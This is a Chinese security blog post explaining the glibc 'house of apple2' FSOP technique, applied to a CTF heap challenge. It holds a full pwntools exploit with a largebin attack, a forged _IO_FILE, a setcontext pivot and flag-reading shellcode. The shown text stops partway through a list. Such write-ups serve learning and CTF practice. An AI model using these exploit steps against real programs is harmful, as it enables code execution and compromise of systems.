
<!DOCTYPE html>
<html lang="ch">
<head>
    <meta charset="utf-8" />
    <title>house_of_apple2利用手法浅析 | Collectcrop&#39;s Blog</title>
    <meta name="author" content="collectcrop" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>COLLECTCROP&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;COLLECTCROP&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>house_of_apple2利用手法浅析</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/11/10
        </span>
        
        <span class="category">
            <a href="/categories/pwn/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                pwn
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/pwn/" style="color: #00bcd4">
                    pwn
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/heap/" style="color: #ffa2c4">
                    heap
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/house-of/" style="color: #00a596">
                    house of
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><ul>
<li>2.23——至今</li>
</ul>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>能控制_IO_FILE的vtable和_wide_data(一般使用largebin attack)</li>
<li>程序从main函数返回，或者执行exit函数</li>
<li>能泄露libc_base和heap_base</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code></li>
<li>控制<code>_wide_data</code>为可控的堆地址空间</li>
<li>控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流</li>
</ol>
<p>总体来说还是利用FSOP，最后<code>_IO_flush_all_lockp</code>中触发调用<code>_IO_OVERFLOW (fp, EOF)</code>这个虚表函数，因为到了高版本glibc，所以不能直接改虚表，需要借助到其他相似结构的其他虚表。</p>
<p>大致有三条链：</p>
<pre><code>_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)

_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)

_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
</code></pre>
<h4 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h4><p>这里以源鲁杯的futureheap这道题对这种利用方式进行学习。</p>
<h5 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h5><p>先熟悉一下几个结构体的具体字段。</p>
<h6 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h6>

<h6 id="IO-wfile-jumps"><a href="#IO-wfile-jumps" class="headerlink" title="_IO_wfile_jumps"></a>_IO_wfile_jumps</h6>

<h6 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="_IO_file_jumps"></a>_IO_file_jumps</h6>

<h6 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h6>

<blockquote>
<p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
<p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable  段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个**_IO_xxx_jumps**的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
</blockquote>
<p>我们的思路就是借鉴FSOP，用_wide_data这个成员结构体中的_wide_vtable，同样是宏调用，但没有进一步的检测。</p>
<h5 id="1-IO-wfile-overflow链"><a href="#1-IO-wfile-overflow链" class="headerlink" title="1._IO_wfile_overflow链"></a>1._IO_wfile_overflow链</h5><p>源码：</p>
<pre><code class="c">_IO_wfile_overflow (FILE *f, wint_t wch)
&#123;
  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */
    &#123;
      f-&gt;_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    &#125;
  /* If currently reading or no buffer allocated. */
  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)
    &#123;
      /* Allocate a buffer if needed. */
      if (f-&gt;_wide_data-&gt;_IO_write_base == 0)
    &#123;
      _IO_wdoallocbuf (f);
      _IO_free_wbackup_area (f);
      _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,
             f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);

      if (f-&gt;_IO_write_base == NULL)
        &#123;
          _IO_doallocbuf (f);
          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);
        &#125;
    &#125;
      else
    &#123;
          ......
    &#125;
      
      
_IO_wdoallocbuf (FILE *fp)
&#123;
  if (fp-&gt;_wide_data-&gt;_IO_buf_base)
    return;
  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,
             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);
&#125;
      
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
#define _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
                       + offsetof(TYPE, MEMBER)))
</code></pre>
<p>首先最终的目标是<code>_IO_wdoallocbuf</code>中的<code>(wint_t)_IO_WDOALLOCATE (fp)</code>的调用，追踪几个宏定义会发现，最终执行了<code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code>这样一个函数。这里的_wide_vtable实际上就是一个虚表，其0x68偏移处就是<code>__doallocate</code>这一项。</p>


<p>那么我们反向追溯一下，发现需要让如下的条件成立以绕过条件判断：</p>
<pre><code class="c">fp-&gt;_wide_data-&gt;_IO_buf_base==0;
!(fp-&gt;_flags &amp; _IO_UNBUFFERED)!=0;	//(fp-&gt;_flags &amp; 0x2)==0;
f-&gt;_wide_data-&gt;_IO_write_base == 0;
f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0;		//f-&gt;_flags &amp; 0x800 == 0;
f-&gt;_flags &amp; _IO_NO_WRITES==0;		//f-&gt;_flags &amp; 0x8==0;
</code></pre>
<p>伪造的_IO_FILE对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code>，因为_IO_FILE的0xa0偏移处是_wide_data域。</li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>由于触发FSOP的<code>_IO_flush_all_lockp</code>函数中有这么一条判断，所以我们要使前两个条件有一个为真，也就是<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 或 <code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>，第一个条件比较好满足。</p>
<pre><code class="c">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
       || (_IO_vtable_offset (fp) == 0
           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
       )
      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
    result = EOF;
</code></pre>
<p>需要注意的是，最后是<code>call qword ptr [rax + 0x68]</code>实现跳转，所以在rax+0x68的位置不能直接是shellcode，而是一个合法的地址。在这里报错时就可以观察寄存器信息，这里rdx实质就指向我们之前伪造的fake_IO_FILE的_wide_data域。</p>


<p>这里setcontext能够把rdx作为一个类sigFrame的指针，然后恢复各字段。然后就能够进行各种操作了，比如进行srop等等。</p>


<p>现在我们来分析一下futureheap这道题</p>




<p>首先这个init函数中是经典的伪随机数的利用，可以最终得到libc_base和一个fortune的地址，这个fortune是一个rwx的段，可以写shellcode然后想办法执行。这道题也刚好沙箱禁用了直接的execve调用和一些基本的orw函数。但是我们只要能劫持程序执行流，还是能比较方便的利用系统调用读取flag。</p>










<p>还是比较经典的菜单题，主要功能有add，delete和edit。其中delete存在UAF，add只能申请largebin chunk。edit有3次机会，之后会直接调用exit退出。然后还存在一个函数，只要输对密码就能往fortune中写入0x500字节。这个密码的获取是一个简单的换表base64。</p>
<p>那么我们就可以开始学习house of apple2的利用了，首先就是用largebin attack来把_IO_list_all改成我们一个largebin chunk的地址，然后再在该largebin chunk中伪造IO_FILE结构体。</p>
<pre><code class="python">add(0,0x528)
add(1,0x520)
add(2,0x518)
delete(0)
add(3,0x550)
delete(2)
log.success(&quot;_io_list_all:&quot;+hex(_IO_list_all))
edit(0,p64(0)*3+p64(_IO_list_all-0x20))
</code></pre>
<p>一开始的largebin attack过程就不过多赘述了，先留一个chunk在largebin里，改掉其bk_nextsize域为<code>tar-0x20</code>，然后再让一个较小的chunk进入到largebin时，就能触发glibc2.31版本以上的改单一地址的largebin attack。到这里我们的_IO_list_all被成功改写成largebin chunk的地址。</p>


<p>然后最关键的就是这个<code>_IO_FILE</code>结构体的构造,由于我们是从数据域开始写，所以一开始的<code>_flags</code>和<code>_IO_read_ptr</code>是无法通过edit控制的。</p>
<pre><code class="python">fake_IO_FILE  = p64(0)*2
fake_IO_FILE += p64(1) + p64(2) #_write_base,_write_ptr
fake_IO_FILE += p64(0)+p64(0) #_IO_buf_base,_IO_buf_end 
fake_IO_FILE += p64(0)      #_IO_save_base
fake_IO_FILE += p64(0)      #_IO_backup_base
fake_IO_FILE += p64(0)*5
fake_IO_FILE += p64(0)       #_lock
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#39;\x00&#39;)
fake_IO_FILE += p64(fortune+0x18)    #_wide_data
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b&#39;\x00&#39;)
fake_IO_FILE += p64(0)            # _mode = 0
fake_IO_FILE += p64(fortune+0x108)       #setcontext-&gt;rsp
fake_IO_FILE += p64(fortune+0x108)     #setcontext-&gt;rcx
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#39;\x00&#39;)
fake_IO_FILE += p64(_IO_wfile_jumps)  # vtable
fake_IO_FILE = fake_IO_FILE.ljust(0xf8,b&#39;\x00&#39;)
fake_IO_FILE += p64(fortune+0x100-0x68)
fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
fake_IO_FILE += p64(setcontext+61) + shellcode


edit(2,fake_IO_FILE)

passwd = &quot;74r0t#C@rd&quot;
out()
p.sendline(passwd)
p.sendline(fake_IO_FILE)
</code></pre>




<p>首先将<code>write_base</code>和<code>write_ptr</code>这两个字段分别置1和2，并且把mode置0是为了满足<code>_IO_flush_all_lockp</code>中一个条件，原理见上文。之后要把vtable指向<code>_IO_wfile_jumps</code>，这是因为虽然在glibc2.24及以上多了一个对虚表地址的检测，使其不能偏离所在段太远，但是我们还是可以利用附近的别的虚表进行利用。这里我们选择触发的是<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code>。也就是<code>_IO_flush_all_lockp</code>中的<code>_IO_OVERFLOW (fp, EOF)</code>这个。因为多态的设计，虚表的结构都是一样的，所以我们本来是调用正常的overflow虚表函数，这里我们劫持到<code>_IO_wfile_jumps</code>后，我们调用的就是<code>__GI__IO_wfile_overflow</code>。然后其具体函数实现里给了我们可趁之机。</p>


<p>然后就能进入<code>_IO_wfile_overflow</code>中。这里我们_flags字段为0，是能够满足里面的各种条件的。然后最关键的就是伪造的<code>IO_FILE</code>的<code>_wide_data</code>这个字段的赋值，因为我们没有堆的基址，但有一个fortune的地址，所以我们可以把伪造的<code>_wide_data</code>这个结构体放到fortune这个位置处，为了方便我们可以复用原来的伪造到堆上的IO_FILE结构，但是因为要使<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code>，所以我们进行一定的错位，这里我选择的是把<code>_wide_data</code>弄到<code>fortune+0x18</code>，这个位置去。然后就能满足下面这两个条件</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
</ul>
</blockquote>
<p>之后来看后面的构造，我们要找到一个B的位置，然后控制<code>*(B + 0x68)</code>，这样就能把我们的RIP劫持到目标地址处去了</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
</blockquote>
<p>也就是如下面这3部分的构造。由于我们最后是call到C这里，所以不能直接执行shellcode。我们可以通过setcontext来将rsp放到目标位置，然后setcontext中间会push一个rcx，所以我们可以连带着rcx设置为目标shellcode位置，最后ret到rcx指向的地址，也就执行了我们事先布置的shellcode了。这里rdx就是我们之前布置的<code>_wide_data</code>的位置，然后我们在不影响原来_IO_FILE利用时，设置对应偏移字段来达成特定寄存器的赋值。</p>
<pre><code class="python">fake_IO_FILE += p64(fortune+0x100-0x68)
fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
fake_IO_FILE += p64(setcontext+61) + shellcode
</code></pre>




<p>exp:</p>
<pre><code class="python">from pwn import *
import ctypes
context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
context.terminal=[&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]
table = &quot;polikujmyhntgbrfvedcwsxqazQWERTYUIOPASDFGHJKLZXCVBNM)!@#$%^&amp;*(+/&quot;
libc = ctypes.CDLL(&quot;./libc.so.6&quot;)
def get_addr():
    return u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
p = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)
glibc = ELF(&quot;./libc.so.6&quot;)
# gdb.attach(p)
name = b&quot;a&quot;*8 + p32(0x88888888)
p.sendlineafter(&quot;dear:&quot;,name)

libc.srand(0x88888888)
wolf = libc.rand()
sword = libc.rand()
log.success(&quot;wolf:&quot;+str(wolf)+&quot;  sword:&quot;+str(sword))

p.recvuntil(&quot;Lion is &quot;)
lion = int(p.recvuntil(&#39;.&#39;)[:-1])
log.success(&quot;Lion:&quot;+str(lion))

p.recvuntil(&quot;Snake is &quot;)
snake = int(p.recvuntil(&#39;.&#39;)[:-1])
log.success(&quot;snake:&quot;+str(snake))

setvbuf_add = lion ^ wolf ^ libc.rand()
libc_base = setvbuf_add - glibc.sym[&quot;setvbuf&quot;]
log.success(&quot;libc_base:&quot;+hex(libc_base))
v0 = snake ^ libc.rand()
fortune = v0 ^ sword
log.success(&quot;fortune:&quot;+hex(fortune))


open=libc_base+glibc.sym[&#39;open&#39;]
read=libc_base + glibc.sym[&#39;read&#39;]
write=libc_base + glibc.sym[&#39;write&#39;]
stderr=libc_base+glibc.sym[&#39;stderr&#39;]
_IO_list_all=libc_base+glibc.sym[&#39;_IO_list_all&#39;]
setcontext=libc_base + glibc.sym[&#39;setcontext&#39;]
_IO_wfile_jumps =libc_base+glibc.sym[&#39;_IO_wfile_jumps&#39;]

def add(idx,size):
    p.sendline(&quot;1&quot;)
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())

def delete(idx):
    p.sendline(&quot;3&quot;)
    p.sendline(str(idx).encode())

def edit(idx,content):
    p.sendline(&quot;2&quot;)
    p.sendline(str(idx).encode())
    p.sendline(content)

def out():
    p.sendline(&quot;4&quot;)


add(0,0x528)
add(1,0x520)
add(2,0x518)
delete(0)
add(3,0x550)
delete(2)
log.success(&quot;_io_list_all:&quot;+hex(_IO_list_all))
edit(0,p64(0)*3+p64(_IO_list_all-0x20))


add(4,0x600)


shellcode=asm(f&#39;&#39;&#39;
mov rdi,0
sub rdi,100
mov rdx,0
push rdx
mov rdx,rsp
mov rsi, 0x67616c662f
push rsi
mov rsi,rsp
add rdx,0x100
mov r10,0x18
mov rax,0x1b5
syscall

mov rdi, 1
mov rsi, 3
push 0
mov rdx, rsp
mov r10, 0x100
push SYS_sendfile
pop rax
syscall
&#39;&#39;&#39;)

fake_IO_FILE  = p64(0)*2
fake_IO_FILE += p64(1) + p64(2) #_write_base,_write_ptr
fake_IO_FILE += p64(0)+p64(0) #_IO_buf_base,_IO_buf_end 
fake_IO_FILE += p64(0)      #_IO_save_base
fake_IO_FILE += p64(0)      #_IO_backup_base
fake_IO_FILE += p64(0)*5
fake_IO_FILE += p64(0)       #_lock
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#39;\x00&#39;)
fake_IO_FILE += p64(fortune+0x18)    #_wide_data
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b&#39;\x00&#39;)
fake_IO_FILE += p64(0)            # _mode = 0
fake_IO_FILE += p64(fortune+0x108)       #setcontext-&gt;rsp
fake_IO_FILE += p64(fortune+0x108)     #setcontext-&gt;rcx
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#39;\x00&#39;)
fake_IO_FILE += p64(_IO_wfile_jumps)  # vtable
fake_IO_FILE = fake_IO_FILE.ljust(0xf8,b&#39;\x00&#39;)
fake_IO_FILE += p64(fortune+0x100-0x68)
fake_IO_FILE = fake_IO_FILE.ljust(0x100,b&#39;\x00&#39;)
fake_IO_FILE += p64(setcontext+61) + shellcode


edit(2,fake_IO_FILE)

passwd = &quot;74r0t#C@rd&quot;
out()
p.sendline(passwd)
p.sendline(fake_IO_FILE)

gdb.attach(p)
# p.sendline(b&quot;2&quot;)

p.interactive()
</code></pre>
<h5 id="2-IO-wfile-underflow-mmap链"><a href="#2-IO-wfile-underflow-mmap链" class="headerlink" title="2._IO_wfile_underflow_mmap链"></a>2._IO_wfile_underflow_mmap链</h5><p>源码：</p>
<pre><code class="c">static wint_t
_IO_wfile_underflow_mmap (FILE *fp)
&#123;
  struct _IO_codecvt *cd;
  const char *read_stop;

  if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))
    &#123;
      fp-&gt;_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    &#125;
  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;

  cd = fp-&gt;_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end
      /* No.  But maybe the read buffer is not fully set up.  */
      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)
    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */
    return WEOF;

  /* There is more in the external.  Convert it.  */
  read_stop = (const char *) fp-&gt;_IO_read_ptr;

  if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)
    &#123;
      /* Maybe we already have a push back pointer.  */
      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)
    &#123;
      free (fp-&gt;_wide_data-&gt;_IO_save_base);
      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
    &#125;
      _IO_wdoallocbuf (fp);
    &#125;

  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;
  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =
    fp-&gt;_wide_data-&gt;_IO_buf_base;
  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,
              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,
              &amp;read_stop,
              fp-&gt;_wide_data-&gt;_IO_read_ptr,
              fp-&gt;_wide_data-&gt;_IO_buf_end,
              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);

  fp-&gt;_IO_read_ptr = (char *) read_stop;

  /* If we managed to generate some text return the next character.  */
  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)
    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;

  /* There is some garbage at the end of the file.  */
  __set_errno (EILSEQ);
  fp-&gt;_flags |= _IO_ERR_SEEN;
  return WEOF;
&#125;

int
_IO_file_underflow_mmap (FILE *fp)
&#123;
  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
    return *(unsigned char *) fp-&gt;_IO_read_ptr;

  if (__glibc_unlikely (mmap_remap_check (fp)))
    /* We punted to the regular file functions.  */
    return _IO_UNDERFLOW (fp);

  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
    return *(unsigned char *) fp-&gt;_IO_read_ptr;

  fp-&gt;_flags |= _IO_EOF_SEEN;
  return EOF;
&#125;
</code></pre>
<p>需满足的条件如下</p>
<pre><code class="c">fp-&gt;_flags &amp; _IO_NO_READS == 0;
fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end;
fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end == false;
fp-&gt;_wide_data-&gt;_IO_buf_base == NULL;
fp-&gt;_wide_data-&gt;_IO_save_base == NULL;	//也可以不为null，但要执行一次free和flag的设置，最好设置为0
</code></pre>
<p>实质上就是进入的点不同，最后利用的链还是相同的。这里如果只是单纯的把虚表从<code>_IO_wfile_jumps</code>改成<code>_IO_wfile_jumps_mmap</code>，实际最后还是会进入overflow那个函数。因为这两个虚表其实是完全相同的，而我们触发的是原来表中overflow那个虚表函数。我们需要添加偏移来进入不同的函数，在本题中，经测试+0x10的偏移能够进入<code>_IO_wdefault_uflow</code>，偏移+0x30能进入<code>_IO_wfile_seekoff</code>，+8偏移能成功进入<code>_IO_wfile_underflow_mmap</code>，其实就是对应原表的偏移。</p>
<p>构造如下</p>
<ul>
<li><code>_flags</code> &#x3D; <code>~4</code></li>
<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> &#x3D; <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_save_base</code> &#x3D; <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> &#x3D; 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
